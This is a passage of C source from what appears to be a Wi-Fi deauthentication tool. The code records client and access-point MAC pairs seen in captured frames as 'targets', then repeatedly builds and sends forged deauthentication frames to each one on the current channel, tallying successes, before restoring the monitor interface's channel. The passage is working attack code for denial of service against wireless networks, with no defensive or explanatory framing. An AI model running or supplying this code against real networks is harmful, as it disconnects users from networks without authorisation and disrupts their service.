            if(tods && !fromds){ sta = a2; ap = a1; }
            else if(!tods && fromds){ sta = a1; ap = a2; }

            if(!sta){ continue; }
            if(sta[0] & 0x01){ continue; }
            if(memcmp(sta, zeromac, 6) == 0){ continue; }
            if(memcmp(ap, zeromac, 6) == 0){ continue; }

            int is_exist = 0;
            for(int j = 0; j < n_targets; j++){
                if(memcmp(targets[j].mac, sta, 6) == 0 && memcmp(targets[j].ap, ap, 6) == 0){ is_exist = 1; break; }
            }
            if(is_exist){ continue; }
            if(n_targets >= CLIENTS_MAX_RECORD){ log_print("warn", "Too many targets (over %d), list truncated", CLIENTS_MAX_RECORD); is_full = 1; continue; }

            memcpy(targets[n_targets].mac, sta, 6);
            memcpy(targets[n_targets].ap, ap, 6);
            targets[n_targets].ch = cur_ch;
            char tmp[18]; log_print("info", "Target added: %s", mac2str(sta, tmp));

            t_last_send[n_targets] = 0;
            n_targets++;
        }

    send:
        for(int i = 0; i < n_targets && running; i++){
            if(cur_ch != targets[i].ch){ continue; }
            if(now - t_last_send[i] < SEND_IVL){ continue; }

            int flen = build_deauth(frame, targets[i].mac, targets[i].ap, targets[i].ap);
            if(flen <= 0){ continue; }
            ssize_t n = send(fd, frame, flen, 0);
            if(n != flen){ count_fail++; }
            else{ count_suc++; n_last_1++; }

            n_last_15++;
            t_last_send[i] = now;
        }
        usleep(10000);
    }

    close(fd);
    if(ch > 0){
        if(netlink_set_channel(mon_iface, ch)){ log_print("warn", "Cannot restore channel to %d", ch); }
        else{ log_print("info", "Restored channel to %d", ch); }
    }
    return 0;
}